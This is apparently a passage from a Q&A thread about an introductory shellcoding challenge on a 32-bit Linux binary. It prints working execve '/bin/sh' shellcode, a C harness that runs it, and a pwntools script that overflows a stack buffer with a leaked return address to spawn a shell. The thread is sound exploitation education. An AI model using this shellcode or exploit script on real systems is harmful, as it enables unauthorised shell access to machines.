    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>Currently working through an introductory shellcoding challenge, and having trouble getting the shellcode to work consistently.</p>\n<p>I'm working on a 32bit Linux binary. I found this shellcode:</p>\n<p><a href=\"http://shell-storm.org/shellcode/files/shellcode-827.php\" rel=\"noreferrer\">http://shell-storm.org/shellcode/files/shellcode-827.php</a></p>\n<pre><code>xor    %eax,%eax\npush   %eax\npush   $0x68732f2f\npush   $0x6e69622f\nmov    %esp,%ebx\npush   %eax\npush   %ebx\nmov    %esp,%ecx\nmov    $0xb,%al\nint    $0x80\n</code></pre>\n<p>As a first step, I ran the shellcode in a simple test program:</p>\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\n\nunsigned char code[] = \\ \n\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\"\n\"\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";\n\nmain()\n{\n    printf(\"Shellcode length: %d\\n\", strlen(code));\n    int (*ret)() = (int(*)())code;\n    ret();\n}\n</code></pre>\n<p>Shellcode works perfectly in this test program. Problems start when I move the shellcode into the actual challenge binary. I can confirm in GDB that:</p>\n<ol>\n<li>Code execution is re-directed into the stack.</li>\n<li>The shellcode assembly is correct in the stack.</li>\n</ol>\n<p>However, when program execution gets to one of these two lines in the shellcode:</p>\n<pre><code>0xffffd0e4:    push       %ebx\n0xffffd0e5:    mov        %esp,%ecx\n</code></pre>\n<p>I get:</p>\n<pre><code>SIGSEGV, Segmentation fault\n</code></pre>\n<p>My question is: why does shellcode that works in a test program fail in the actual binary? How would I go about troubleshooting this?</p>\n<p>Thank you!</p>\n</div>",

When you run from <code>gdb</code> you have the code that will jump to the beginning of the buffer (this is the part <code>\\xc0\\xd0\\xff\\xff</code>) and for your <code>gdb</code> sessions, this is true since <code>gdb</code> turns <a href=\"https://en.wikipedia.org/wiki/Address_space_layout_randomization\" rel=\"nofollow noreferrer\">ASLR</a> off. </p>\n<p>You can check that by issuing this command in <code>gdb</code>:</p>\n<blockquote>\n<p>gdb-peda$ show disable-randomization <br/>\n  Disabling randomization of debuggee's virtual address space is on.</p>\n</blockquote>\n<p>If you change that by <code>set disable-randomization off</code> it should start failing also in <code>gdb</code> as the buffer will be located each time at a different location.</p>\n<p>In order to do this correctly, you need to locate where the buffer is. This is also why you have a tip where it is located in the first message.</p>\n<p>To compensate for that two issues I would use <a href=\"https://github.com/Gallopsled/pwntools#readme\" rel=\"nofollow noreferrer\">pwntools</a> for this and prepare a script:</p>\n<pre><code>from pwn import *\n\ncontext(arch='i386', os='linux')\n\nr = process('./shellcoding.dms')\n# read the line that has the info about the address\nl = r.recvline()\nprint l\n# extract it\naddr = int(l[18:], 16)\n#nop sled at the end but not actually needed. We only need to fill the space for the buffer to overwrite the ret\nexploit = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"+\"\\x90\"*21 \nprint \"Address is: \"+hex(addr)\n# add an address to be taken from the stack by ret\nexploit += p32(addr) \n\nr.send(exploit+\"\\n\")\n# read the \"ok... lets see if you got it...\" message\nr.recvline()\nr.interactive() #pwn\n</code></pre>\n<p>Running this should work!</p>\n</div>",

I had no idea that having the NOPs after the shellcode vs. before the shellcode would have such a big effect. Pwntool code was also great. Was not aware of the p32() functionality, which is very helpful. On to the next one!</span>",
